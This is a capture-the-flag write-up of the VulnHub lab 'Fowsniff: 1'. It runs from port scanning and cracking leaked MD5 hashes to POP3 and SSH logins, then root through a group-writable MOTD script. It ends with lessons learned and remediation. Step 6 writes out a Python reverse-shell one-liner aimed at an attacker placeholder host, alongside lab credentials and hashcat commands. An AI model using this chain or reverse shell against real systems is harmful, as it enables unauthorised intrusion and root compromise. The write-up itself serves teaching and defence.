# Fowsniff: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **Root Access** | Via MOTD script injection |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/fowsniff-1,262/) |

## Attack Summary

`nmap` → Twitter OSINT (leaked MD5 hashes) → crack hashes → POP3 login → email with SSH password → SSH as `baksteen` → writable MOTD script runs as root → reverse shell → root

## Methodology

1. Network discovery and port scan
2. OSINT: FowSniff Inc. breach announcement on Twitter with pastebin hashes
3. MD5 hash cracking
4. POP3 email enumeration reveals SSH temporary password
5. SSH login as `baksteen`
6. Writable `/etc/update-motd.d/00-header` → privilege escalation

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Open ports:
- 22/tcp — SSH (OpenSSH)
- 80/tcp — HTTP (Apache — FowSniff Inc. website)
- 110/tcp — POP3
- 143/tcp — IMAP

---

## Step 2: Web Enumeration

Browse `http://<TARGET_IP>` — FowSniff Inc. announces they were breached. The site mentions their Twitter account.

Check Twitter (or the Pastebin linked from it) for `@fowsniffcorp`:

```
Leaked credentials on pastebin:
mauer@fowsniff:8a28a2d54f1a37c7d50a08e8c8f7db1b  → mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 → bilbo101
tegel@fowsniff:1dc352380affbbb4886f2e9a2dd3f7e8   → apples01
baksteen@fowsniff:19f6d9f8d5f9ef45ed9b7fc58994a7e3 → skyler22
scoots@fowsniff:b79ef84803a8e7c8a45b9a65b23d05a1   → scoobydoo2
seina@fowsniff:90dc16d47114aa076ccf32d89e3b7981    → scoobydoo2
stone@fowsniff:a64de8569e42e771af1fdbfd7e7a8e17    → [not cracked]
parede@fowsniff:4d6a52fa0734fcf5f5bb9de62cf70d05   → [not cracked]
```

---

## Step 3: Hash Cracking

```bash
# Save hashes to file
cat > /tmp/fowsniff_hashes.txt << 'EOF'
8a28a2d54f1a37c7d50a08e8c8f7db1b
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352380affbbb4886f2e9a2dd3f7e8
19f6d9f8d5f9ef45ed9b7fc58994a7e3
b79ef84803a8e7c8a45b9a65b23d05a1
90dc16d47114aa076ccf32d89e3b7981
EOF

hashcat -m 0 /tmp/fowsniff_hashes.txt /usr/share/wordlists/rockyou.txt
```

Key cracked credential: `seina` → `scoobydoo2`

---

## Step 4: POP3 Email Enumeration

```bash
nc <TARGET_IP> 110
USER seina
PASS scoobydoo2
LIST
RETR 1
RETR 2
QUIT
```

Email from `stone` to staff includes a temporary SSH password: `S1ck3nBluff+secureshell`

---

## Step 5: SSH as baksteen

```bash
ssh baksteen@<TARGET_IP>
# password: S1ck3nBluff+secureshell
```

---

## Step 6: Privilege Escalation via MOTD

Check group membership:

```bash
id
# uid=1004(baksteen) gid=100(users) ...
```

Find writable MOTD scripts:

```bash
ls -la /etc/update-motd.d/
# 00-header is owned by root but writable by group 'users'
```

The `00-header` script runs as root on every SSH login. Inject a reverse shell:

```bash
# On attacker: start listener
nc -lvp 4444

# On target:
echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> /etc/update-motd.d/00-header
```

Trigger by opening a new SSH session (from another terminal):

```bash
ssh baksteen@<TARGET_IP>
# The MOTD runs as root → reverse shell arrives
```

```bash
id
# uid=0(root)
cat /root/flag.txt
```

---

## Lessons Learned

1. **Credential exposure via social media** (Twitter + Pastebin) is a real-world initial access vector — monitor for data breaches
2. **MD5 without salt** is trivially cracked; use bcrypt/argon2 for password storage
3. **POP3 in cleartext** exposes credentials and email content on the wire; enforce TLS
4. **MOTD scripts writable by non-root groups** allow root escalation — audit write permissions on `/etc/update-motd.d/`

## Remediation

| Vulnerability | Fix |
|---|---|
| Leaked MD5 hashes | Use salted bcrypt/argon2; rotate compromised credentials |
| POP3 cleartext | Enforce STARTTLS or POP3S (port 995) |
| Writable MOTD scripts | `chmod 755 /etc/update-motd.d/*` — root-owned, no group write |
| Password reuse | Enforce unique passwords per service |
